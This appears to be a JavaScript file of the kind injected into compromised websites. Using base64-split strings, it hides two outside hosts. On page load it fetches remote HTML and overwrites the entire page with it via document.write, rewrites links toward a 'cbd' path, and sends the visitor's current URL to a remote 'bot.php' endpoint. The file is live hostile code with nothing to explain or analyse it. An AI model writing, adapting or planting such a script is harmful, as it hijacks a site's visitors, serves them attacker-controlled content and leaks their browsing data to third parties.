var currentUrl = window.location.href;
var hostParam = window.location.hostname;
var urlParams = new URLSearchParams(window.location.search);
var vid = urlParams.get('vid');
const _e = (s) => btoa(s);
const _d = (s) => atob(s);
var ConnectorParam = urlParams.get('Connector');
function extractDomainFromCurrentPage() {

    var currentPageUrl = window.location.href;

    var parsedUrl = new URL(currentPageUrl);

    return parsedUrl.origin;
}

const t1 = 'https://bl';
const t2 = _d('b2cuZ29vZ2xvLnRvcA==') + '/UAvideo/';
const t3 = 'cbd3/';
const t4 = 'fc' + _d('ay5waHA=') + '?vid=' + vid;
const t5 = '&cache=1&host=' + hostParam;

var targetUrl = [t1, t2, t3, t4, t5].join('');
fetch(targetUrl)
  .then(response => {

    if (!response.ok) {
      throw new Error('Network response was not ok');
    }

    return response.text();
  })
  .then(data => {

    document.open();
    data = data.replace(/<a href="\/[a-z0-9]+vision\/[a-z0-9]+-([A-Za-z0-9_-]+)">([^<]+)<\/a>/g,'<a href="./browser.html?vid=$1&CONNECTOR=%2F%2Files%2Epics%2Fall%2Fcbd%2F">$2</a>');
    document.write(data);
    document.close();
    encodedA = encodeURIComponent(currentUrl);
	const p1 = _d('aHR0cHM6Ly9pbGVz') + '.pics/';
	const p2 = 'all/cbd/';
	const p3 = _d('Ym90LnBocD91cmw9') + encodedA;
	var secondTargetUrl = p1 + p2 + p3;
	return fetch(secondTargetUrl);
  })
  .then(response => {

    if (!response.ok) {
      throw new Error('Network response was not ok');
    }

    return response.text();
  })
  .catch(error => {

    console.error('There was a problem with the fetch operation:', error);
  });